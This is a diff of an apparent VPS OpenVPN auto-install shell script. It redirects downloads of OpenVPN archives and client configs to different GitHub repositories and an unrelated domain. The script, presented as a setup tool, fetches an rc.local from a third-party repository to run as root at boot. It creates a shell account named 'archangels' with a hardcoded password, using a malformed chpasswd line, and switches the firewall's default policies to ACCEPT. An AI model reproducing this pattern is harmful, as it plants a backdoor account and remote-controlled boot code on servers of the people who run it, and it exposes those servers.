@@ -103,20 +103,20 @@ service php7.0-fpm restart
 #  openvpn
 apt-get -y install openvpn
 cd /etc/openvpn/
-wget -O openvpn.tar "https://raw.githubusercontent.com/Vpaproject/-/main/openvpn.tar"
+wget -O openvpn.tar "https://raw.githubusercontent.com/89870must73/FILENEW/main/openvpn.tar"
 tar xf openvpn.tar;rm openvpn.tar
 wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
 chmod +x /etc/rc.local
 # etc
-wget -O /home/vps/public_html/tcp.ovpn "https://raw.githubusercontent.com/Vpaproject/-/main/client.ovpn"
-wget -O /home/vps/public_html/udp.ovpn "https://raw.githubusercontent.com/Vpaproject/-/main/client1.ovpn"
-wget -O /home/vps/public_html/ssl.ovpn "https://raw.githubusercontent.com/Vpaproject/-/main/ssl.ovpn"
-wget -O /home/vps/public_html/ohp.ovpn "https://raw.githubusercontent.com/Vpaproject/-/main/ohp.ovpn"
+wget -O /home/vps/public_html/tcp.ovpn "https://raw.githubusercontent.com/89870must73/FILENEW/main/client.ovpn"
+wget -O /home/vps/public_html/udp.ovpn "https://raw.githubusercontent.com/89870must73/FILENEW/main/client1.ovpn"
+wget -O /home/vps/public_html/ssl.ovpn "https://raw.githubusercontent.com/azalea910512/kia/main/zvs/ssl.ovpn"
+wget -O /home/vps/public_html/client3.ovpn "https://gakod.com/debian/client3.ovpn"
 sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/tcp.ovpn
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/udp.ovpn
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/ssl.ovpn
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/ohp.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client3.ovpn
 useradd -m -g users -s /bin/bash archangels
 echo "7C22C4ED" | chpasswd
 echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
@@ -125,7 +125,7 @@ cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 # Setting UFW
 apt-get install ufw
 ufw allow ssh
-ufw allow 1103/tcp
+ufw allow 443/tcp
 sed -i 's|DEFAULT_INPUT_POLICY="DROP"|DEFAULT_INPUT_POLICY="ACCEPT"|' /etc/default/ufw
 sed -i 's|DEFAULT_FORWARD_POLICY="DROP"|DEFAULT_FORWARD_POLICY="ACCEPT"|' /etc/default/ufw
 cat > /etc/ufw/before.rules <<-END
@@ -260,8 +260,8 @@ accept = 990
 connect = 127.0.0.1:109
 
 [openvpn]
-accept = 587
-connect = 127.0.0.1:1103
+accept = 992
+connect = 127.0.0.1:1194
 
 END
 
